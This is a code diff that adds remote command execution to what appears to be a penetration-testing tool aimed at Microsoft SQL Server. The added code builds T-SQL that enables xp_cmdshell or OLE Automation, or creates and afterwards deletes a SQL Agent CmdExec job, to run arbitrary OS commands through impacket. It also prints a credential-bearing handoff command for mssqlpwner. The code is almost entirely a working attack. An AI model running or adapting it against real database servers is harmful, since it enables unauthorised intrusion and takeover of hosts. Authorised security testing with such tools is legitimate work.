@@ -968,6 +968,90 @@ def run_xp_dirtree(ip: str, creds: dict, lhost: str, port: int = _DEFAULT_PORT,
     return True, None
 
 
+# --- command execution for effect (xp_cmdshell / OLE / Agent / CLR) -------------
+_EXEC_TMP = r"C:\Windows\Temp\recce_out.txt"
+
+
+def _tsql_lit(s: str) -> str:
+    """Escape a value for a single-quoted T-SQL string literal."""
+    return (s or "").replace("'", "''")
+
+
+def build_exec_script(command: str, method: str = "xp") -> str | None:
+    """T-SQL that runs `command` via the chosen primitive and returns its output
+    between @@X:out sentinels. Returns None for an unknown/handoff method (clr)."""
+    lit = _tsql_lit(command)
+    tmp = _EXEC_TMP
+    read = (f"SELECT BulkColumn FROM OPENROWSET(BULK '{tmp}', SINGLE_CLOB) AS x")
+    if method == "xp":
+        body = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;\n"
+                "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;\n"
+                f"EXEC xp_cmdshell '{lit}'")
+    elif method == "ole":
+        inner = _tsql_lit(f"cmd.exe /c {command} > {tmp} 2>&1")
+        body = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;\n"
+                "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;\n"
+                "DECLARE @o INT;\n"
+                "EXEC sp_OACreate 'WScript.Shell', @o OUT;\n"
+                f"EXEC sp_OAMethod @o, 'Run', NULL, '{inner}', 0, 1;\n"
+                "EXEC sp_OADestroy @o;\n"
+                f"{read}")
+    elif method == "agent":
+        inner = _tsql_lit(f"cmd.exe /c {command} > {tmp} 2>&1")
+        body = ("USE msdb;\n"
+                "EXEC dbo.sp_add_job @job_name='recce_rce';\n"
+                "EXEC dbo.sp_add_jobstep @job_name='recce_rce', @step_name='s1', "
+                f"@subsystem='CmdExec', @command='{inner}';\n"
+                "EXEC dbo.sp_add_jobserver @job_name='recce_rce';\n"
+                "EXEC dbo.sp_start_job @job_name='recce_rce';\n"
+                "WAITFOR DELAY '00:00:05';\n"
+                f"{read};\n"
+                "EXEC dbo.sp_delete_job @job_name='recce_rce'")
+    else:
+        return None
+    return f"SELECT '@@X:out'\n{body}\nSELECT '@@XE:out'\nexit\n"
+
+
+def parse_exec(output: str) -> str:
+    """Extract the command output from between the @@X:out sentinels, dropping
+    impacket's table chrome (separators, column header, NULLs)."""
+    import re
+    m = re.search(r"@@X:out\b(.*?)@@XE:out\b", output, re.S)
+    if not m:
+        return ""
+    lines = []
+    for line in m.group(1).splitlines():
+        s = line.strip()
+        if not s or "----" in s or s.startswith("@@") or s in ("output", "BulkColumn", "NULL"):
+            continue
+        lines.append(s)
+    return "\n".join(lines)
+
+
+def exec_command(ip: str, creds: dict, command: str, method: str = "xp",
+                 port: int = _DEFAULT_PORT, windows_auth: bool = True):
+    """Execute `command` on the instance via `method` and return (output, error,
+    handoff). For method='clr' recce does NOT load an assembly (that's the existing
+    tools' job) - it returns a handoff command instead."""
+    if method == "clr":
+        dom = creds.get("domain", "")
+        who = f"{dom}/{creds.get('user', '')}:{creds.get('secret', '')}@{ip}" if dom \
+            else f"{creds.get('user', '')}:{creds.get('secret', '')}@{ip}"
+        ref = (f"mssqlpwner {who} custom-asm \"{command}\"   "
+               "(or PowerUpSQL Invoke-SQLOSCmdCLR) - loads a signed CLR assembly")
+        return None, None, ref
+    script = build_exec_script(command, method)
+    if script is None:
+        return None, f"unknown method '{method}'", None
+    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
+    if cmd is None:
+        return None, "impacket-mssqlclient not installed", None
+    out, err = _run_stdin(cmd, script, timeout=120)
+    if err:
+        return None, err, None
+    return parse_exec(out), None, None
+
+
 # --- top-level analysis ---------------------------------------------------------
 
 def findings_to_vulns(fs: list[dict]) -> dict:
